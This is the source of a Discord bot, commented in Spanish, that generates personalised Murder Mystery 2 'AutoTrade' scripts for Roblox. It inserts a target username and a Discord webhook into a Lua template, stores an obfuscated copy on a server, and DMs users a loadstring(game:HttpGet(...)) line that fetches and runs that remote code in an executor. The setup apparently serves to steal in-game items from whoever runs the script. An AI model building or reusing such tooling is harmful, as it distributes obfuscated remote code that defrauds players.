require('dotenv').config();
const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  StringSelectMenuBuilder,
  StringSelectMenuOptionBuilder,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ActionRowBuilder,
} = require('discord.js');
const axios = require('axios');
const fs = require('fs');

const client = new Client({
  intents: [GatewayIntentBits.DirectMessages, GatewayIntentBits.GuildMessages, GatewayIntentBits.Guilds, GatewayIntentBits.MessageContent],
});

// Configuración
const SERVER_URL = process.env.SERVER_URL || `http://localhost:${process.env.PORT || 3000}`;
let MM2_SCRIPT = '';

// Cargar script Lua al iniciar
try {
  MM2_SCRIPT = fs.readFileSync('./mm2-script.lua', 'utf8');
  console.log('✅ Script MM2 cargado correctamente');
} catch (error) {
  console.error('❌ Error al cargar mm2-script.lua:', error.message);
  process.exit(1);
}

// Eventos del bot
client.once('ready', () => {
  console.log(`✅ Bot conectado como ${client.user.tag}`);
  console.log(`📊 Sirviendo a ${client.guilds.cache.size} servidores`);

  // Registrar comandos slash
  const commands = [
    new SlashCommandBuilder()
      .setName('generate')
      .setDescription('Genera un script personalizado')
      .addSubcommand(sub =>
        sub
          .setName('script')
          .setDescription('Genera script de AutoTrade para MM2')
      ),
  ];

  client.application.commands.set(commands);
  console.log('✅ Comandos registrados');
});

client.on('interactionCreate', async (interaction) => {
  try {
    if (interaction.isCommand()) {
      if (interaction.commandName === 'generate' && interaction.options.getSubcommand() === 'script') {
        // Mostrar select menu de juegos
        const selectMenu = new StringSelectMenuBuilder()
          .setCustomId('game_select')
          .setPlaceholder('Selecciona un juego')
          .addOptions(
            new StringSelectMenuOptionBuilder()
              .setLabel('Murder Mystery 2')
              .setValue('mm2')
              .setDescription('AutoTrade para MM2')
              .setEmoji('🔪')
          );

        const row = new ActionRowBuilder().addComponents(selectMenu);
        await interaction.reply({
          content: '🎮 Selecciona el juego para generar tu script personalizado:',
          components: [row],
          ephemeral: true,
        });
      }
    }

    if (interaction.isStringSelectMenu()) {
      if (interaction.customId === 'game_select') {
        const game = interaction.values[0];

        // Mostrar modal con validación
        const modal = new ModalBuilder()
          .setCustomId(`config_modal_${game}`)
          .setTitle('Configurar Script Personalizado');

        const usernameInput = new TextInputBuilder()
          .setCustomId('username')
          .setLabel('Tu Usuario de Roblox')
          .setStyle(TextInputStyle.Short)
          .setPlaceholder('ejemplo: claudee')
          .setRequired(true)
          .setMinLength(1)
          .setMaxLength(20);

        const webhookInput = new TextInputBuilder()
          .setCustomId('webhook')
          .setLabel('Discord Webhook URL')
          .setStyle(TextInputStyle.Paragraph)
          .setPlaceholder('https://discord.com/api/webhooks/...')
          .setRequired(true)
          .setMinLength(10);

        modal.addComponents(
          new ActionRowBuilder().addComponents(usernameInput),
          new ActionRowBuilder().addComponents(webhookInput)
        );

        await interaction.showModal(modal);
      }
    }

    if (interaction.isModalSubmit()) {
      if (interaction.customId.startsWith('config_modal_')) {
        const game = interaction.customId.replace('config_modal_', '');
        const username = interaction.fields.getTextInputValue('username');
        const webhook = interaction.fields.getTextInputValue('webhook');

        await interaction.deferReply({ ephemeral: true });

        // Validar webhook
        if (!isValidWebhook(webhook)) {
          await interaction.editReply({
            content: '❌ El webhook URL no es válido. Debe ser una URL de webhook de Discord.',
          });
          return;
        }

        // Validar username
        if (!isValidUsername(username)) {
          await interaction.editReply({
            content: '❌ El nombre de usuario no es válido. Usa solo letras, números y guiones.',
          });
          return;
        }

        try {
          // Generar script personalizado
          const script = await generateScript(game, username, webhook);

          // Almacenar script ofuscado en el servidor
          const storeResponse = await axios.post(`${SERVER_URL}/api/store-script`, { script });
          const { id, url } = storeResponse.data;

          // Generar loadstring simple
          const loadstring = `loadstring(game:HttpGet("${url}"))()`;

          // Enviar DM al usuario
          try {
            const dmChannel = await interaction.user.createDM();
            await dmChannel.send(`your script - made by joszz\n\`\`\`\n${loadstring}\n\`\`\``);
            await interaction.editReply({
              content: '✅ Script generado exitosamente. Revisa tu DM privado.',
            });

            console.log(`📝 Script generado para ${interaction.user.tag} (${username}) - ID: ${id}`);
          } catch (err) {
            console.error('DM Error:', err);
            await interaction.editReply({
              content: '❌ No se pudo enviar DM. ¿Tienes los DMs abiertos con bots?',
            });
          }
        } catch (error) {
          console.error('Script Generation Error:', error);
          await interaction.editReply({
            content: `❌ Error al generar script: ${error.message}`,
          });
        }
      }
    }
  } catch (error) {
    console.error('Interaction Error:', error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({
        content: '❌ Error procesando tu solicitud. Intenta de nuevo.',
        ephemeral: true,
      }).catch(console.error);
    }
  }
});

// Funciones
async function generateScript(game, username, webhook) {
  if (game === 'mm2') {
    return MM2_SCRIPT
      .replace(/TARGET_USER = "example"/g, `TARGET_USER = "${username}"`)
      .replace(/WEBHOOK_URL = "example"/g, `WEBHOOK_URL = "${webhook}"`);
  }
  throw new Error('Juego no soportado');
}

function isValidWebhook(webhook) {
  try {
    const url = new URL(webhook);
    return url.hostname === 'discord.com' && webhook.includes('/webhooks/');
  } catch {
    return false;
  }
}

function isValidUsername(username) {
  return /^[a-zA-Z0-9_-]{1,20}$/.test(username);
}

const OWNER_ID = '842098865661935677';
let reactEnabled = true;
const botStartTime = Date.now();

const CMDS_LIST =
  '```\n' +
  '.cmds          → Lista de comandos (solo en DM)\n' +
  '.info          → Info del bot y juego\n' +
  '.noreact       → Activar/desactivar reacciones ✔️\n' +
  '.ping          → Latencia del bot\n' +
  '.uptime        → Tiempo encendido\n' +
  '.stats         → Scripts activos y servidores\n' +
  '.scripts       → Cuántos scripts hay en memoria\n' +
  '.say <msg>     → Hablar como el bot en ese canal\n' +
  '.dm <id> <msg> → Enviar DM a un usuario\n' +
  '.status <txt>  → Cambiar estado del bot\n' +
  '.reload        → Recargar mm2-script.lua\n' +
  '```';

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  const isOwner = message.author.id === OWNER_ID;
  const content = message.content.trim();

  // Auto-react solo al owner
  if (isOwner && reactEnabled) {
    try { await message.react('✔️'); } catch {}
  }

  // Comando público .info
  if (content === '.info') {
    await message.reply(
      '🔪 **Josz Bot**\n\n' +
      '**¿Qué hace?** Genera scripts personalizados de AutoTrade para Roblox.\n' +
      '**Juego:** Murder Mystery 2 (MM2)\n\n' +
      '**¿Cómo usarlo?**\n' +
      '1. Escribe `/generate script`\n' +
      '2. Selecciona **Murder Mystery 2**\n' +
      '3. Ingresa tu usuario de Roblox y tu webhook\n' +
      '4. Recibirás un `loadstring` en tu DM — solo pégalo en tu executor'
    ).catch(() => {});
    return;
  }

  // Comandos solo para el owner
  if (!isOwner) return;

  if (content === '.cmds') {
    await message.author.send('📋 **Comandos del owner:**\n' + CMDS_LIST).catch(() => {});
    return;
  }

  if (content === '.noreact') {
    reactEnabled = !reactEnabled;
    await message.reply(`Reacciones ${reactEnabled ? '**activadas** ✔️' : '**desactivadas** ❌'}`).catch(() => {});
    return;
  }

  if (content === '.ping') {
    const ping = client.ws.ping;
    await message.reply(`🏓 Latencia: **${ping}ms**`).catch(() => {});
    return;
  }

  if (content === '.uptime') {
    const ms = Date.now() - botStartTime;
    const h = Math.floor(ms / 3600000);
    const m = Math.floor((ms % 3600000) / 60000);
    const s = Math.floor((ms % 60000) / 1000);
    await message.reply(`⏱️ Uptime: **${h}h ${m}m ${s}s**`).catch(() => {});
    return;
  }

  if (content === '.stats') {
    await message.reply(
      `📊 **Stats**\n` +
      `Servidores: **${client.guilds.cache.size}**\n` +
      `Usuarios: **${client.users.cache.size}**\n` +
      `Latencia: **${client.ws.ping}ms**`
    ).catch(() => {});
    return;
  }

  if (content === '.scripts') {
    // Accede al store del servidor via HTTP
    try {
      const r = await axios.get(`${SERVER_URL}/health`);
      await message.reply(`✅ Servidor activo | ${r.data.timestamp}`).catch(() => {});
    } catch {
      await message.reply('❌ Servidor caído').catch(() => {});
    }
    return;
  }

  if (content.startsWith('.say ')) {
    const text = content.slice(5).trim();
    if (!text) return;
    await message.channel.send(text).catch(() => {});
    try { await message.delete(); } catch {}
    return;
  }

  if (content.startsWith('.dm ')) {
    const parts = content.slice(4).trim().split(' ');
    const userId = parts[0];
    const text = parts.slice(1).join(' ');
    if (!userId || !text) {
      await message.reply('Uso: `.dm <userID> <mensaje>`').catch(() => {});
      return;
    }
    try {
      const user = await client.users.fetch(userId);
      await user.send(text);
      await message.reply(`✅ DM enviado a **${user.tag}**`).catch(() => {});
    } catch {
      await message.reply('❌ No se pudo enviar el DM').catch(() => {});
    }
    return;
  }

  if (content.startsWith('.status ')) {
    const text = content.slice(8).trim();
    if (!text) return;
    client.user.setActivity(text);
    await message.reply(`✅ Estado cambiado a: **${text}**`).catch(() => {});
    return;
  }

  if (content === '.reload') {
    try {
      MM2_SCRIPT = fs.readFileSync('./mm2-script.lua', 'utf8');
      await message.reply('✅ mm2-script.lua recargado').catch(() => {});
    } catch (err) {
      await message.reply(`❌ Error: ${err.message}`).catch(() => {});
    }
    return;
  }
});

// Error handlers
client.on('error', error => {
  console.error('🔴 Client Error:', error);
});

process.on('unhandledRejection', error => {
  console.error('🔴 Unhandled Rejection:', error);
});

// Login
client.login(process.env.DISCORD_TOKEN);
